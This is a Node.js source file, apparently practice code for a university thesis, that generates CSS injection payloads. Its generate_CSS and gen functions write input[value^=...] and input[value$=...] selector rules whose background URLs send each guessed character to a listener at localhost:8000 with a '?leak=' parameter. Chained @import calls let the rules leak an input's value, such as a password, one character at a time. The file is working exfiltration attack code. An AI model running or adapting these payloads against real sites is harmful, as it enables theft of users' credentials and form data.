const axios = require('axios')
const fs = require('fs')
const util = require('util')


function root() {
    return new Promise((resolve, reject) => {
        axios.get('http://localhost:9000')
        .then((res) => {
            resolve(res)
        })
    })
}

function f() {
    axios('http://localhost:9000/posts.js')
    .then((res) => {
        console.log(res.data)
    })
}

function reg() {
    let r = new RegExp('!(/+/posts.js)')
    console.log(r)
}

//------------------------------------------------------------------------

function g() {
    var fs = require('fs')

    fs.readFile('./gen/moj.css', (err, data) => {
        if(err !== null && err.errno == -4058) {
            fs.appendFile('./gen/moj.css', 'Hello there', (err) => {
                if(err) {
                    throw err
                }
            })
        }
    })
}

//name('moj34.css')
function name(last) {
    var num = []

    var i = 3
    while(last[i] !== '.') {
        num.push(last[i])
        i++
    }

    var number = parseInt(num.join('')) + 1
    var new_name = 'moj' + String(number) + '.css'
    console.log(new_name)
}

//60  2

function create_charset() {
    var set = []
    i = 33
    while(i < 256) {
        if(i == 60 || i == 2) {
            set.push(String.fromCharCode(60) + String.fromCharCode(i))
        }
        else {
            set.push(String.fromCharCode(i))
        }
        i++
    }
    return set
}

function counter(nums) {
    nums[0]++
    for(var j = 0; j < nums.length; j++) {
        if (nums[j] == 222) {
            if (j != 5) {
                nums[j] = 0
                nums[j + 1]++
            }
            else {
                return null
            }
        }
    }
    return nums
}

function create_string(nums, set) {
    var str = ''
    for(var i = 0; i < nums.length; i++) {
        if(nums[i] != -1) {
            str += set[nums[i]]
        }
        else {
            break
        }
    }
    return str
}

//61,489,248,123,744
//[0,0,0,0,0,111]
function progress(nums) {
    var state = 0
    var total = 122978496247489
    for(var i = 0; i < nums.length; i++) {
        state += nums[i]*Math.pow(223, i)
    }
    console.log((state/total)*100, nums)
}

function gen() {
    var set = create_charset()
    console.log(set.length)
    var nums = [0,-1,-1,-1,-1,-1]
    var i = 0
    do {
        var str = create_string(nums, set)
        var rule = util.format('input[value$="%s"] {background: url("http://localhost:8000/?leak=%s");}\n', str, str)
        fs.appendFileSync('./gen/moj.css', rule)
        nums = counter(nums)
        i++
        if (i == 10000) {
            progress(nums)
            i = 0
        }
    }while(nums != null)
    console.log("FINISH")
}

function generate_CSS(num, pass) {
    var root = 'C:\\Users\\Luka\\Desktop\\Faks\\Diplomski\\practise\\styles\\'
    var name = num + '.css'
    var data = 'input[value^="%s"] {background: url("http://localhost:8000/?leak=%s&q=%s");}\n'
    var i = 33
    fs.writeFileSync(root + name, util.format('@import url("http://localhost:8000/?l=%s");\n', num + 1))
    while(i < 256) {
        if (i == 33) {
            fs.appendFileSync(root + name, util.format(data, pass + String.fromCodePoint(i), String.fromCodePoint(i), Math.random()))
        }
        else if(i == 34 || i == 92) {
            fs.appendFileSync(root + name, util.format(data, pass + String.fromCharCode(92) + String.fromCodePoint(i), String.fromCharCode(92) + String.fromCodePoint(i), Math.random()))
        }
        else {
            fs.appendFileSync(root + name, util.format(data, pass + String.fromCodePoint(i), String.fromCodePoint(i), Math.random()))
        }
        i++
    }
    return root + name
}

function test() {
    console.log(util.format('%s', Math.random()))
}

generate_CSS(1,'')